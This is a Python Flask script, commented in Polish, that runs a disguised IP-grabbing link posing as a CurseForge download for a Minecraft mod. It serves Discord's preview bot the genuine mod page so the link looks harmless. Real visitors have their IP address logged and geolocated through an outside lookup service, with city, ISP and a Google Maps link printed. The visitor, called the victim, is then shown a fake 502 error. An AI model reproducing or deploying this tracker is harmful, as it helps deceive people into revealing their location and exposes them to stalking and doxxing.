import requests
import sys
from flask import Flask, request, redirect

app = Flask(__name__)

# --- KONFIGURACJA ---
# Oryginalny link dla bota Discorda, żeby wyświetlił ładny podgląd moda
ORIGINAL_MOD_LINK = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/cdn-download/7401617')
def logger():
    # Pobieranie User-Agent (sprawdzamy czy to bot czy człowiek)
    ua = request.headers.get('User-Agent', '')
    
    # Pobieranie prawdziwego adresu IP ofiary przez proxy Rendera
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. OSZUKIWANIE BOTA (CLOAKING)
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(ORIGINAL_MOD_LINK)

    # 2. LOGOWANIE DO KONSOLI RENDERA
    print(f"\n[!!!] KTOŚ KLIKNĄŁ W LINK [!!!]", flush=True)
    print(f"ADRES IP: {ip}", flush=True)
    
    try:
        # Pobieranie danych geograficznych na podstawie IP
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country,isp", timeout=5).json()
        
        if r.get("status") == "success":
            lat = r.get('lat')
            lon = r.get('lon')
            city = r.get('city')
            country = r.get('country')
            isp = r.get('isp')
            
            # GENEROWANIE LINKU DO MAPY GOOGLE
            # Używamy formatu, który od razu centruje mapę na współrzędnych
            google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            
            print(f"LOKALIZACJA: {city}, {country}", flush=True)
            print(f"DOSTAWCA INTERNETU: {isp}", flush=True)
            print(f"📍 LINK DO MAPY GOOGLE: {google_maps_link}", flush=True)
        else:
            print(f"BŁĄD: Nie udało się namierzyć lokalizacji dla tego IP.", flush=True)
    except Exception as e:
        print(f"BŁĄD SKRYPTU: {e}", flush=True)
    
    print("-" * 30, flush=True)
    sys.stdout.flush()

    # 3. CO WIDZI OFIARA (Sfingowany błąd serwera)
    return '<h1>502 Bad Gateway</h1><p>The server returned an invalid response from the upstream server. Please try again later.</p>', 502

if __name__ == '__main__':
    # Serwer startuje na porcie 10000 (wymóg Rendera)
    app.run(host='0.0.0.0', port=10000)
